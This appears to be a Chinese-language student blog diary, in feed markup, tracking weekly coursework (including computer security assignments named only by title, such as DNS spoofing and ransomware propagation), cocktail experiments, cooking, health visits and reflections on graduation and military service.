<summary>沒去上課的壞學生</summary><ul><li><p>資料科學與程式實務</p><ul><li>翹課，要自己補完上課進度</li><li>Hw1 complete:<ul><li>PMF sampling and drafting</li><li>PDF sampling and drafting</li></ul></li></ul></li><li><p>電腦安全總整</p><ul><li>Hw1 demo complete: Hw2 的spec要看仔細，忘記改chmod被扣10分</li><li>Hw2 announcement:</li></ul></li><li><p>計算機網路管理</p><ul><li>Hw2 in progress:<ul><li>dns setting</li></ul></li></ul></li><li><p>基因演算法與管理科學應用</p><ul><li>GA basic 02 complete:<ul><li>discrete GA encoding</li></ul></li></ul></li><li><p>資料庫管理</p><ul><li>Hw2 complete:<ul><li>ER diagram</li><li>Entity table</li></ul></li><li>Project start:<ul><li>第一次討論<ol><li>題目: Spotify 開發</li><li>進度: API, database finding</li></ol></li><li>預計下次討論出具體目標與繪製ER diagram</li></ul></li></ul></li><li><p>前端網頁系統開發概論</p><ul><li>Hw1 complete:<ul><li>basic HTML page generating concating with CSS</li><li>VM setting</li></ul></li></ul></li><li><p>React development</p><ul><li>突然多的新課程 </details></li></ul></li></ul></li><li><p>日常</p><ul><li>調酒<ul><li>拿伯爵茶酒作 highball</li><li>心得: 感覺比較適合作有酸的調酒</li></ul></li><li>健康<ul><li>皮膚科看診: 乳液選擇與養成習慣抹乳液</li><li>腸胃科看診: 要多喝水、要開始吃易生菌了</li></ul></li></ul></li><li><p>目標</p><ul><li><input disabled="" type="checkbox"> 補完資料科學與程式落掉的課程</li><li><input disabled="" type="checkbox"> 完成計算機網路管理Hw2，另寫一文章記錄過程與方法; 補完bind 課程的video</li><li><input disabled="" type="checkbox"> 討論基因演算法與管理科學應用期末專題要幹嘛</li><li><input disabled="" type="checkbox"> 資料庫管理期末專題開發參與</li><li><input disabled="" type="checkbox"> 完成前端網頁系統開發概論</li><li><input disabled="" type="checkbox"> 研究一下React development看可不可以用在其他課程的專題</li></ul></li></ol><h1 id="第六周"><a href="#第六周" class="headerlink" title="第六周"></a>第六周</h1><pre><code>&gt; Na 好難，上發條</code></pre><ol><li><p>Review goal</p><ul><li><input checked="" disabled="" type="checkbox"> 補完資料科學與程式落掉的課程</li><li><input checked="" disabled="" type="checkbox"> 完成計算機網路管理Hw2，另寫一文章記錄過程與方法; 補完bind 課程的video</li><li><input disabled="" type="checkbox"> 討論基因演算法與管理科學應用期末專題要幹嘛: 分好組但沒進度</li><li><input checked="" disabled="" type="checkbox"> 資料庫管理期末專題開發參與</li><li><input checked="" disabled="" type="checkbox"> 完成前端網頁系統開發概論</li><li><input disabled="" type="checkbox"> 研究一下React development看可不可以用在其他課程的專題: 無</li></ul></li><li><p>課業   </p> <details> <summary>恨兩周前的自己</summary><ul><li><p>資料科學與程式實務</p><ul><li>翹課，要自己補完上課進度</li><li>Hw2 announcement:<ul><li>Monte Carlo simulation</li></ul></li></ul></li><li><p>電腦安全總整</p><ul><li>Hw2 announcement:</li></ul></li><li><p>計算機網路管理</p><ul><li>Hw2 complete: 另見: 網路管理-DNS &amp; Resolver Setting</li></ul></li><li><p>基因演算法與管理科學應用</p><ul><li>GA06-discreateCoding complete:<ul><li>discrete GA encoding</li></ul></li></ul></li><li><p>資料庫管理</p><ul><li>Project:<ul><li>Data preprocessing: transform Json to csv</li><li>預計下次討論出具體目標與繪製ER diagram</li></ul></li></ul></li><li><p>前端網頁系統開發概論</p></li><li><p>React development</p><ul><li>基礎React Jsx 架構 </details></li></ul></li></ul></li><li><p>日常</p><ul><li>調酒<ul><li>複習: <ul><li>Gimlet: 對檸檬掌控度不夠</li><li>蜂蠟洗烏龍琴酒 soda</li></ul></li></ul></li><li>酒吧<ul><li>Bar Routune: 很讚</li></ul></li><li>自煮<ul><li>炒泡麵</li><li>紅燒豆腐</li><li>炒青菜</li></ul></li><li>家教<ul><li>複習: 以跟學生比賽的形式有效幫助效率提升</li></ul></li></ul></li><li><p>目標</p><ul><li><input disabled="" type="checkbox"> 資料科學與程式實務Hw2</li><li><input disabled="" type="checkbox"> 前端網頁系統開發概論Hw2</li><li><input disabled="" type="checkbox"> 基因演算法與管理科學應用期末專題</li><li><input disabled="" type="checkbox"> 資料庫期中準備</li></ul></li></ol><h1 id="第七-八周"><a href="#第七-八周" class="headerlink" title="第七&amp;八周"></a>第七&amp;八周</h1><pre><code>&gt; 期中周大爆炸，沒時間紀錄</code></pre><ol><li>Review goal<ul><li><input checked="" disabled="" type="checkbox"> 前端網頁系統開發概論Hw2(part of)</li><li><input checked="" disabled="" type="checkbox"> 基因演算法與管理科學應用期末專題: 發表完期中報告</li><li><input checked="" disabled="" type="checkbox"> 資料庫期中準備: 開始準備資料與API串接</li></ul></li><li>課業    <details> <summary>期中考</summary><ul><li>資料科學與程式實務<ul><li>Hw2 reannouncement:<ul><li>更改死線，重新上傳spec</li></ul></li></ul></li><li>電腦安全總整<ul><li>期中考: <a href="https://withoutdirection.github.io/2025/04/13/CSC-midterm/">準備中</a></li><li>Hw2 in progress:<ul><li>ICMP redirect: 不知道為甚麼victim有收到但沒有change route</li><li>DNS spoofing: 以nfiqueue實作</li></ul></li></ul></li><li>計算機網路管理<ul><li>期中考: [考得不怎樣] (<a href="https://withoutdirection.github.io/2025/04/19/NA-midterm/">https://withoutdirection.github.io/2025/04/19/NA-midterm/</a>)</li><li>Hw3 announcement:<ul><li>Mail server</li></ul></li></ul></li><li>基因演算法與管理科學應用<ul><li>GA07-TSP-uniformCrossover complete:<ul><li>GA solving TSP problem</li></ul></li><li>GA08-VRP complete:<ul><li>GA solving VRP problem</li></ul></li></ul></li><li>資料庫管理 <ul><li>期中考: 考得不難但完全忘記1&#x2F;2&#x2F;3NF的functional dependency 關係</li></ul></li><li>前端網頁系統開發概論<ul><li>Hw2 preview: html based calculator</li></ul></li><li>React development<ul><li>期中停課 </details></li></ul></li></ul></li><li>日常<ul><li>調酒<ul><li>創條發想: <ul><li>Tequila&#x2F; 青花椒&#x2F; 馬告&#x2F; 楊桃&#x2F; 野薑花</li><li>冷翠咖啡當vermouth</li></ul></li></ul></li><li>家教<ul><li>期中考複習</li></ul></li></ul></li><li>目標<ul><li><input disabled="" type="checkbox"> 資料科學與程式實務Hw2</li><li><input disabled="" type="checkbox"> 基因演算法與管理科學應用期末專題</li><li><input disabled="" type="checkbox"> 資料庫專題</li></ul></li></ol><h1 id="第九周"><a href="#第九周" class="headerlink" title="第九周"></a>第九周</h1><pre><code>&gt; 錄取中研院實習</code></pre><ol><li>Review goal<ul><li><input checked="" disabled="" type="checkbox"> 資料科學與程式實務Hw2</li><li><input checked="" disabled="" type="checkbox"> 基因演算法與管理科學應用期末專題: 寫完推薦系統</li><li><input checked="" disabled="" type="checkbox"> 資料庫專題: 同上</li></ul></li><li>課業 <details> <summary>快樂周</summary><ul><li>資料科學與程式實務<ul><li>Hw2 in progress:</li></ul></li><li>電腦安全總整<ul><li>期中考: 烤蠻差的，期末要記得寫考古，考好多考古</li><li>Hw2 complete: Demo complete</li><li>Hw3 announcement: Ransomware Propagation<ul><li>Crack SSH password</li><li>Compression Virus with Ransomware Propagation</li><li>Ransomware Payload</li></ul></li></ul></li><li>計算機網路管理<ul><li>Mail system</li></ul></li><li>基因演算法與管理科學應用<ul><li>Term project: recommendation system program</li></ul></li><li>資料庫管理 <ul><li>Term project: 同上</li></ul></li><li>React development<ul><li>上禮拜忘記要去上課:( </details></li></ul></li></ul></li><li>日常<ul><li>調酒<ul><li>5&#x2F;2 到Friday’s bar 當客座調酒師</li><li>冷淬曼特寧大成功</li></ul></li><li>自煮<ul><li>野菇雞腿奶油炊飯</li></ul></li></ul></li><li>目標<ul><li><input disabled="" type="checkbox"> 資料科學與程式實務Hw2</li><li><input disabled="" type="checkbox"> 討論基因演算法與管理科學應用期末專題下一步動向</li><li><input disabled="" type="checkbox"> NA Hw3</li><li><input disabled="" type="checkbox"> 準備客座調酒</li></ul></li></ol><h1 id="第十周"><a href="#第十周" class="headerlink" title="第十周"></a>第十周</h1><pre><code>&gt; 退選NA</code></pre><ol><li>Review goal<ul><li><input checked="" disabled="" type="checkbox"> 資料科學與程式實務Hw2 almost complete</li><li><input checked="" disabled="" type="checkbox"> 基因演算法與管理科學應用期末專題: 寫完推薦系統</li><li><input checked="" disabled="" type="checkbox"> 資料庫專題: 同上</li><li><input checked="" disabled="" type="checkbox"> NA Hw3: 鏖戰15小時做不出進度，挑戰不修SA先修NA失敗</li></ul></li><li>課業<details><summary>上週不該快樂的</summary> * 資料科學與程式實務       - Hw2 complete: 找到作業給的公式單位有問題       - statics notebook * 電腦安全總整 * 基因演算法與管理科學應用       - GA09-flowshop * 資料庫管理        - SQL language * React development       - Props and rendering * 前端網頁系統開發概論       - Hw2 announcement:            - CSS           - JS </details></li><li>日常<ul><li><p>調酒</p><ul><li>實作 冷萃曼特寧 + rye whisky作為manhattan twist</li></ul></li><li><p>自煮</p><ul><li>煎牛排: 小失敗，放置不夠久</li></ul></li></ul></li><li>目標<ul><li><input disabled="" type="checkbox"> 資料科學與程式實務Hw2</li><li><input disabled="" type="checkbox"> 準備客座調酒</li><li><input disabled="" type="checkbox"> 退選NA</li><li><input disabled="" type="checkbox"> 電安HW3 start</li><li><input disabled="" type="checkbox"> 前端網頁系統開發概論Hw2</li></ul></li></ol><h1 id="第十一至十六周"><a href="#第十一至十六周" class="headerlink" title="第十一至十六周"></a>第十一至十六周</h1><pre><code>&gt; 發生了大意外，小時候(高中)被醫生說因為脊椎側彎不用當兵的我經過逾半年的體檢、複檢，最後被通知沒那麼彎，還是要當兵。&gt; 為了不讓兵役耽誤半年後跟暑假實習，決定把除了電安的課程都退選，主動讓自己延畢&gt; 但還是把幾項學期專案都做完了&gt; 於是把最後這幾周的事情濃縮一下，為這學期作結</code></pre><ol><li>Achivement<ul><li><input checked="" disabled="" type="checkbox"> 完成一項以Django開發專案: 結合基因演算法與資料庫時做一項Spotify音樂個人化推薦並利用github 與 render 部署 </li><li><input checked="" disabled="" type="checkbox"> 完成一項以React開發專案: 結合前端網頁系統開發概論與React課程做一個任務牌程的前端網頁程式</li><li><input checked="" disabled="" type="checkbox"> 實作完電腦安全總整的四項project: <ul><li>MITM and Pharming Attacks in Wi-Fi Networks </li><li>TLS Connection Hijacking</li><li>Ransomware Propagation and Payload</li><li>Capture The Flag (CTF)</li></ul></li><li><input checked="" disabled="" type="checkbox"> 學習資料科學與程式實務的統計學基礎: <ul><li>完成 Monte Carlo simulation, PMF sampling, PDF sampling, and basic statistics</li><li>閱讀與紀錄統計學notebook(<em>有待完善</em>)</li></ul></li><li><input checked="" disabled="" type="checkbox"> Network Administration(<em>提前退選</em>): <ul><li>完成 DNS &amp; Resolver Setting, Firewall Setting</li></ul></li></ul></li><li>心得:<br> 對於未來有些徬徨，要畢業了(雖然延畢半年但只差三學分)卻有點找不太到自己未來的志業，有點想往網路與電安發展但目前基礎好像有點不夠扎實。<br> 也覺得自己有些太依賴AI 工具完成作業、project，想試著讓自己可以更獨立思考與解決問題。</li><li>未來<br> 先把暑期實習處理好，同時在補習班準備考研究所，接下來半年應該就是在養自己的同時做好這兩件事情就好。<br> 心無旁鶩</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;對於自己的大學生活很沒有實感&lt;br&gt;以此記錄自己到底做了甚麼&lt;br&gt;也順便藉由設立一些目標來督促自己&lt;/p&gt;
&lt;hr&gt;
&lt;h1 i</summary>
      
    
    
    
    
    <category term="資工" scheme="http://withoutdirection.github.io/tags/%E8%B3%87%E5%B7%A5/"/>
    
    <category term="大學生活" scheme="http://withoutdirection.github.io/tags/%E5%A4%A7%E5%AD%B8%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
